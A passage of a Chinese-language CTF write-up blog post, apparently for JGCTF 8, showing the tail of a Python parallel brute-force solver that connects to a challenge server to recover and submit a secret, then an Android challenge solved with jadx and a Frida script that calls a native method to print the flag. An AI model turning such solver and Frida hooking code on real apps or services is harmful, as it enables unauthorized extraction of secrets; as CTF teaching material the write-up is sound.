进度统计</span></span><br><span class="line">    </span><br><span class="line">    processed = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    total = r_end - r_start</span><br><span class="line">    </span><br><span class="line">    k = <span class="built_in">len</span>(time_indices)</span><br><span class="line">    </span><br><span class="line">    check_times_quick = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">min</span>(K_CHECK, M)))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 预生成 near 偏移迭代器（笛卡儿积部分）</span></span><br><span class="line">    </span><br><span class="line">    near_iters = [<span class="built_in">range</span>(-RADIUS, RADIUS+<span class="number">1</span>)] * k</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 枚举 r</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(r_start, r_end):</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> stop_event.is_set():</span><br><span class="line">    </span><br><span class="line">        <span class="comment"># 其它进程已找到结果，提前退出</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">      processed += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="comment"># 计算每个 time index 的 target</span></span><br><span class="line">    </span><br><span class="line">      Svals_target = []</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">    </span><br><span class="line">        t_index = time_indices[idx]</span><br><span class="line">    </span><br><span class="line">        Sr = Sr_table[idx][r]</span><br><span class="line">    </span><br><span class="line">        Tval = U[t_index]</span><br><span class="line">    </span><br><span class="line">        target = (Tval - Sr) % P</span><br><span class="line">    </span><br><span class="line">        Svals_target.append(target)</span><br><span class="line">    </span><br><span class="line">      <span class="comment"># 对每个组合检查 left_map（组合数 (2R+1)^k，k=3 R=3 =&gt; 343）</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">for</span> deltas <span class="keyword">in</span> product(*near_iters):</span><br><span class="line">    </span><br><span class="line">        key = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">        mul = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">    </span><br><span class="line">          sval = (Svals_target[idx] + deltas[idx]) % P</span><br><span class="line">    </span><br><span class="line">          key += sval * mul</span><br><span class="line">    </span><br><span class="line">          mul *= P</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> left_map:</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">        left_candidates = left_map[key]</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> left_candidates:</span><br><span class="line">    </span><br><span class="line">          s_val = l | (r &lt;&lt; LEFT_BITS)</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">if</span> K_CHECK &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="keyword">not</span> quick_check_candidate(s_val, A, B_list, check_times_quick):</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">if</span> full_check_candidate(s_val, A, B_list):</span><br><span class="line">    </span><br><span class="line">            <span class="comment"># 找到答案，放入队列并设置停止事件</span></span><br><span class="line">    </span><br><span class="line">            result_queue.put((s_val, proc_id, time.time() - t0))</span><br><span class="line">    </span><br><span class="line">            stop_event.<span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">      <span class="comment"># 进度打印（仅本进程打印，避免过多输出）</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> (r - r_start) % PRINT_PROGRESS_EVERY == (PRINT_PROGRESS_EVERY - <span class="number">1</span>):</span><br><span class="line">    </span><br><span class="line">        elapsed = time.time() - t0</span><br><span class="line">    </span><br><span class="line">        rate = processed / elapsed <span class="keyword">if</span> elapsed &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">        remain = (total - processed) / rate <span class="keyword">if</span> rate &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[P<span class="subst">&#123;proc_id&#125;</span>] r <span class="subst">&#123;r&#125;</span>/<span class="subst">&#123;r_end&#125;</span> processed <span class="subst">&#123;processed&#125;</span>/<span class="subst">&#123;total&#125;</span> rate=<span class="subst">&#123;rate:<span class="number">.1</span>f&#125;</span> it/s est_remain=<span class="subst">&#123;remain:<span class="number">.1</span>f&#125;</span>s&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 本进程区间搜索完毕</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 若子进程出错，把错误放回主进程也能帮助 debug</span></span><br><span class="line">    </span><br><span class="line">    result_queue.put((<span class="string">&quot;ERR&quot;</span>, proc_id, <span class="built_in">str</span>(e)))</span><br><span class="line">    </span><br><span class="line">    stop_event.<span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_secret_parallel</span>(<span class="params">B_list</span>):</span><br><span class="line"></span><br><span class="line">  A, C, U, D = build_problem_from_B(B_list)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 分片 r 空间</span></span><br><span class="line"></span><br><span class="line">  num_procs = PROCESSES</span><br><span class="line"></span><br><span class="line">  chunk_size = (RIGHT_SIZE + num_procs - <span class="number">1</span>) // num_procs</span><br><span class="line"></span><br><span class="line">  procs = []</span><br><span class="line"></span><br><span class="line">  stop_event = Event()</span><br><span class="line"></span><br><span class="line">  result_queue = Queue(maxsize=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 启动子进程</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_procs):</span><br><span class="line"></span><br><span class="line">    r_start = i * chunk_size</span><br><span class="line">    </span><br><span class="line">    r_end = <span class="built_in">min</span>((i + <span class="number">1</span>) * chunk_size, RIGHT_SIZE)</span><br><span class="line">    </span><br><span class="line">    p = Process(target=worker_proc, args=(i, r_start, r_end, B_list, A, U, D, TIME_INDICES, result_queue, stop_event))</span><br><span class="line">    </span><br><span class="line">    p.start()</span><br><span class="line">    </span><br><span class="line">    procs.append(p)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 等待结果或所有进程结束</span></span><br><span class="line"></span><br><span class="line">  found = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 阻塞等候直到有结果或所有子进程结束</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> result_queue.empty():</span><br><span class="line">    </span><br><span class="line">        item = result_queue.get()</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, <span class="built_in">tuple</span>) <span class="keyword">and</span> item[<span class="number">0</span>] == <span class="string">&quot;ERR&quot;</span>:</span><br><span class="line">    </span><br><span class="line">          _, pid, errmsg = item</span><br><span class="line">    </span><br><span class="line">          <span class="built_in">print</span>(<span class="string">f&quot;[ERROR] 子进程 <span class="subst">&#123;pid&#125;</span> 报错: <span class="subst">&#123;errmsg&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">          found = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">          s_val, pid, t_used = item</span><br><span class="line">    </span><br><span class="line">          <span class="built_in">print</span>(<span class="string">f&quot;[MAIN] 子进程 <span class="subst">&#123;pid&#125;</span> 找到 secret=<span class="subst">&#123;s_val&#125;</span> 用时 <span class="subst">&#123;t_used:<span class="number">.2</span>f&#125;</span>s&quot;</span>)</span><br><span class="line">    </span><br><span class="line">          found = s_val</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">      alive = <span class="built_in">any</span>(p.is_alive() <span class="keyword">for</span> p <span class="keyword">in</span> procs)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> alive:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">      time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">finally</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 确保停止信号发出并回收子进程</span></span><br><span class="line">    </span><br><span class="line">    stop_event.<span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> procs:</span><br><span class="line">    </span><br><span class="line">      p.join(timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> found</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">  host = <span class="string">&quot;node8.anna.nssctf.cn&quot;</span></span><br><span class="line"></span><br><span class="line">  port = <span class="number">25543</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    s = socket.socket()</span><br><span class="line">    </span><br><span class="line">    s.settimeout(<span class="number">30</span>)</span><br><span class="line">    </span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;已连接到服务器&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    data = <span class="string">b&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">      chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">      data += chunk</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="string">b&quot;&gt;&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    banner = data.decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Server banner (truncated):&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(banner[:<span class="number">1000</span>])</span><br><span class="line">    </span><br><span class="line">    B_list = parse_B_list_from_banner(banner)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> B_list <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;无法解析 B_list&quot;</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;B_list:&quot;</span>, B_list)</span><br><span class="line">    </span><br><span class="line">    t0 = time.time()</span><br><span class="line">    </span><br><span class="line">    secret = find_secret_parallel(B_list)</span><br><span class="line">    </span><br><span class="line">    t_used = time.time() - t0</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;并行搜索总耗时: %.2f s&quot;</span> % t_used)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;未找到 secret&quot;</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;找到 secret:&quot;</span>, secret)</span><br><span class="line">    </span><br><span class="line">    s.send(<span class="built_in">str</span>(secret).encode() + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取服务器响应</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    </span><br><span class="line">      s.settimeout(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">      resp = <span class="string">b&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">        chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">        resp += chunk</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> socket.timeout:</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;服务器响应：&quot;</span>, resp.decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;发生错误:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>



<p><img src="/2025/08/23/JGCTF-8-WP/image18.png"></p>
<h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="我是谁？！"><a href="#我是谁？！" class="headerlink" title="我是谁？！"></a>我是谁？！</h2><p>拖入jadx分析</p>
<p><img src="/2025/08/23/JGCTF-8-WP/image19.png"></p>
<p>如果priv方法返回1，则调用PR.showCND(this)，否则调用PR.showMultiDialogs(this, this.messages)。</p>
<p>this, this.messages 就是垃圾信息</p>
<p>所以这里猜测让他返回1 就能直接打印出flag</p>
<p>最开始尝试 直接hook priv方法，让他强制返回1，但是app直接闪退了</p>
<p>测试半天发现 我们可以直接获取flag字符串，不让他显示ui就行了</p>
<p>尝试直接调用PR.stringFromJNI()方法来获取flag字符串，而不显示对话框</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 直接获取flag字符串</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> <span class="variable constant_">PR</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.nss_4th.ad.PR&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> prInstance = <span class="variable constant_">PR</span>.$new();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> flag = prInstance.<span class="title function_">stringFromJNI</span>();</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Flag: &quot;</span> + flag);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将flag发送到日志或文件</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">send</span>(flag);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p><img src="/2025/08/23/JGCTF-8-WP/image20.png"></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">JGwebre</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://heisha123.github.io/2025/08/23/JGCTF-8-WP/">https://heisha123.github.io/2025/08/23/JGCTF-8-WP/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本站点所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://heisha123.github.io">JG的个人博客</a>！</span></div></div><div class="post-copyright valine" id="comments-container"><script src="//unpkg.com/valine@1.4.14/dist/Valine.min.js"></script><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2];
}
var flag = false;
var gitFun = function () {
    try {
        var valineObj = window.GLOBAL_CONFIG.valine;
        new Valine({
            el: "#comments-container",
            ...valineObj
        });
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></div></article><div id="pagination"><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/08/16/lilctf-re-wp/"><span>LILCTF2025 RE</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2025 By JGwebre</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>